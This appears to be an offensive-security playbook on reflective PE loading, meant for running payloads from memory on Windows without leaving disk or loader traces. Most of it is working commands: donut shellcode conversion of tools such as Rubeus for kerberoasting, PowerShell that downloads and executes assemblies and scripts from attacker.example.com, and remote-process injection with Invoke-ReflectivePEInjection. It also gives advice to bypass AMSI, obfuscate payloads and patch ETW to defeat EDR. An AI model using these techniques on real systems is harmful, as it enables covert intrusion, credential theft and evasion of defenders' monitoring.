# Reflective PE loading

Loading a DLL or executable entirely from memory without touching disk and without
registering with the Windows loader. The payload does not appear in the loaded module
list, has no associated file path, and leaves no Prefetch or Amcache entry.

## Prepare the payload with donut

Donut converts arbitrary PE files, .NET assemblies, and scripts to position-independent
shellcode that loads and executes from memory:

```text
# install
pip install donut-shellcode

# convert a PE (EXE or DLL) to shellcode
donut -f payload.exe -o shellcode.bin

# .NET assembly with arguments
donut -f Rubeus.exe -p "kerberoast /outfile:hashes.txt" -o rubeus_shellcode.bin

# DLL with specific export
donut -f payload.dll -e ExportName -o shellcode.bin

# x64 only (default is x86+x64)
donut -f payload.exe -a 2 -o shellcode.bin
```

The output is a flat binary blob of position-independent shellcode that contains its
own loader. Deliver via process injection.

## PowerShell in-memory assembly load

For .NET assemblies, PowerShell can load directly from a byte array without donut:

```powershell
# download and load a .NET assembly from memory
$url = 'https://attacker.example.com/Rubeus.exe'
$bytes = (New-Object System.Net.WebClient).DownloadData($url)
$asm = [System.Reflection.Assembly]::Load($bytes)

# invoke the entry point with arguments
$asm.EntryPoint.Invoke($null, @(,[string[]]@('kerberoast', '/outfile:hashes.txt')))
```

The assembly exists only in the PowerShell process's memory. No file, no Amcache
entry, no AppLocker artefact for the assembly itself (though AppLocker can restrict
the PowerShell process).

## Invoke-ReflectivePEInjection

PowerSploit's `Invoke-ReflectivePEInjection` loads a PE from memory into the current
process or a remote process:

```powershell
# load the function (itself loaded from memory, not disk)
$bytes = (New-Object System.Net.WebClient).DownloadData('https://attacker.example.com/Invoke-ReflectivePEInjection.ps1')
$asm = [System.Text.Encoding]::UTF8.GetString($bytes)
IEX $asm

# load a DLL into the current process
$dllBytes = (New-Object System.Net.WebClient).DownloadData('https://attacker.example.com/payload.dll')
Invoke-ReflectivePEInjection -PEBytes $dllBytes

# inject into a remote process by PID
$target = (Get-Process explorer).Id
Invoke-ReflectivePEInjection -PEBytes $dllBytes -ProcId $target
```

## Manual reflective loader (C)

For compiled implants, a minimal reflective loader maps the DLL into memory, resolves
imports, and calls the entry point:

```c
// minimal reflective loader skeleton
// 1. find the base address of the shellcode/DLL in memory
// 2. parse the PE headers to find sections, imports, relocations
// 3. allocate new memory region sized to SizeOfImage
// 4. copy sections to their RVA offsets
// 5. process import table: load each required DLL, resolve function addresses
// 6. apply base relocations if not loaded at preferred base
// 7. call DllMain(base, DLL_PROCESS_ATTACH, NULL)

// full implementation: see github.com/stephenfewer/ReflectiveDLLInjection
```

The complete implementation is architecture-specific and version-sensitive. Use an
established implementation rather than writing from scratch.

## Confirming the load is not visible

After loading, verify the module does not appear in standard enumeration:

```powershell
# standard module list should not include the loaded DLL
[System.Diagnostics.Process]::GetCurrentProcess().Modules |
  Select-Object ModuleName, FileName

# also check via tasklist (should not appear)
tasklist /m /fi "IMAGENAME eq powershell.exe"
```

The module will not appear because it was not registered with the PEB loader.
It will appear in a full memory scan looking for PE headers in anonymous executable
regions, which is how EDR products with memory scanning detect it.

## Operational notes

AMSI scans the bytes passed to `Assembly::Load`. If the payload is a known tool
(Rubeus, SharpHound), AMSI will flag it before it executes. Bypass AMSI before
loading, or obfuscate the assembly at build time (attribute renaming, string encoding,
junk insertion).

ETW CLR events record .NET assembly loads regardless of the source. If the EDR
collects ETW CLR events, the assembly load is still logged even without a file path.
ETW patching is required to prevent this telemetry.
